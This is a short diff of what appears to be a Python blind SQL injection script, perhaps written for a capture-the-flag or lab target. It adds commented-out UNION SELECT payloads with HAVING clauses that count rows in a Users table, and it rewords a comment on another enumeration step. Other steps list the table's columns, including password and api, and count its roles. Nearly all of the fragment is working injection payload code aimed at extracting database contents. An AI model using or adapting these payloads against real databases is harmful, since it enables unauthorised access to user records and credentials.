@@ -98,6 +98,15 @@ def main():
     # )
     # print(testing_nrows)
 
+    # 3. count rows in Users table: 165
+    # testing_nrows = len(
+    #     crack(
+    #         "union select NULL,NULL,count(id) from Users having count(id)>={index} limit 1 --+",
+    #         "_"
+    #     )
+    # )
+    # print(testing_nrows)
+
     # 4. count columns in Users table: 7
     # users_ncols = len(
     #     crack(
@@ -115,7 +124,7 @@ def main():
     # )
     # users_cols = ['api', 'id', 'password', 'probation', 'roles', 'username', 'website']
 
-    # 6. count distinct number of roles: 2
+    # 6. count number of distinct roles: 2
     # n_roles = len(
     #     crack(
     #         "union select NULL,NULL,count(distinct roles) from Users having count(distinct roles)>={index} limit 1 --+",
